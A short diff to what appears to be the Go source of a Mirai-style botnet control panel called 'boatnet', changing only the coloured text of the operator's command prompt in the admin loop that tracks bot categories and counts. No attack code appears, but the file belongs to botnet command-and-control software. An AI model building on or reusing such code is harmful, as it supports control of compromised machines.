@@ -96,7 +96,7 @@ func (this *Admin) Handle() {
 	for {
 		var botCatagory string
 		var botCount int
-        this.conn.Write([]byte("\033[47m \033[3;91m" + username + "\033[97m ● \033[3;91mboatnet \033[0m"))
+        this.conn.Write([]byte("\x1b[1;36m[" + username + "\x1b[1;37m@\x1b[1;36mboatnet\x1b[1;37m]\033[0m "))
 		cmd, err := this.ReadLine(false)
 
 		if err != nil || cmd == "exit" || cmd == "quit" || cmd == "out" {
